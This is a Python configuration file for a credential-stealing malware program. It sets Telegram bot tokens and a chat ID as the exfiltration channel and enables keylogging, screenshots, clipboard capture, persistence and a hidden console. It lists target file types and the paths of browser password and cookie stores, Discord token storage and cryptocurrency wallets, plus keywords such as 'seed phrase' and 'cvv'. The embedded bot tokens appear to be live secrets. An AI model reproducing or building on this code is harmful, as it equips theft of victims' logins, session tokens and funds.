from __future__ import annotations

import os
from dataclasses import dataclass, field
from typing import Dict, List, Tuple


@dataclass
class SystemConfig:
    BOTS: Dict[str, Dict[str, str]] = field(default_factory=lambda: {
        "py": {
            "token": "9253522941:AAGkAX7aJcb_0ZdqTmQtupEz8TSINvU4TQ0",
            "chat_id": "5951452314",
        },
        "archive": {
            "token": "8888070632:AAFtJlDpvkUZiD6lop9p2nB_7ukPxeiel9c",
            "chat_id": "5951452314",
        },
        "txt": {
            "token": "8995731327:AAFQNhZOeW_tf0YhzAOgnP3a72AOyQuqcNQ",
            "chat_id": "5951452314",
        },
        "other": {
            "token": "9253522941:AAGkAX7aJcb_0ZdqTmQtupEz8TSINvU4TQ0",
            "chat_id": "5951452314",
        },
    })

    MAX_FILE_SIZE: int = 40 * 1024 * 1024
    CONCURRENCY: int = 300
    TIMEOUT: int = 60
    SCREENSHOT_INTERVAL: int = 60
    CLIPBOARD_INTERVAL: int = 10
    KEYLOG_FLUSH: int = 60
    PERSISTENCE_ENABLED: bool = True
    ANTI_ANALYSIS_ENABLED: bool = False
    HIDE_CONSOLE: bool = True

    TARGET_EXTENSIONS: Tuple[str, ...] = (
        ".py", ".txt", ".pdf", ".jpg", ".js", ".png", ".sql", ".db",
        ".docx", ".zip", ".rar", ".session", ".json", ".xml", ".xlsx",
        ".doc", ".pptx", ".wallet", ".dat", ".key", ".pem", ".env",
        ".log", ".csv", ".config",
    )

    BROWSER_PATHS: Dict[str, List[str]] = field(default_factory=dict)
    DISCORD_PATHS: List[str] = field(default_factory=list)
    CRYPTO_PATHS: List[str] = field(default_factory=list)
    KEYWORDS: List[str] = field(default_factory=list)

    def __post_init__(self) -> None:
        self.BROWSER_PATHS = {
            "chrome": [
                "Google/Chrome/User Data/Default/Login Data",
                "Google/Chrome/User Data/Default/Cookies",
                "Google/Chrome/User Data/Default/History",
                "Google/Chrome/User Data/Local State",
            ],
            "edge": [
                "Microsoft/Edge/User Data/Default/Login Data",
                "Microsoft/Edge/User Data/Default/Cookies",
                "Microsoft/Edge/User Data/Local State",
            ],
            "firefox": [
                "Mozilla/Firefox/Profiles/*/logins.json",
                "Mozilla/Firefox/Profiles/*/key4.db",
            ],
            "brave": [
                "BraveSoftware/Brave-Browser/User Data/Default/Login Data",
                "BraveSoftware/Brave-Browser/User Data/Local State",
            ],
            "opera": [
                "Opera Software/Opera Stable/Login Data",
            ],
        }
        self.DISCORD_PATHS = [
            os.path.expandvars(r"%APPDATA%\Discord\Local Storage\leveldb"),
            os.path.expandvars(r"%APPDATA%\DiscordCanary\Local Storage\leveldb"),
            os.path.expandvars(r"%APPDATA%\DiscordPTB\Local Storage\leveldb"),
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
            os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
        ]
        self.CRYPTO_PATHS = [
            os.path.expandvars(r"%APPDATA%\Bitcoin\wallet.dat"),
            os.path.expandvars(r"%APPDATA%\Ethereum\keystore"),
            os.path.expandvars(r"%APPDATA%\Exodus"),
            os.path.expandvars(r"%APPDATA%\Atomic\Local Storage\leveldb"),
            os.path.expandvars(r"%APPDATA%\MetaMask"),
            os.path.expandvars(r"%LOCALAPPDATA%\Coinomi"),
        ]
        self.KEYWORDS = [
            "password", "credit card", "cvv", "bank", "login",
            "username", "email", "bitcoin", "wallet", "private key",
            "seed phrase", "passphrase", "2fa", "otp", "token",
            "api key", "secret",
        ]
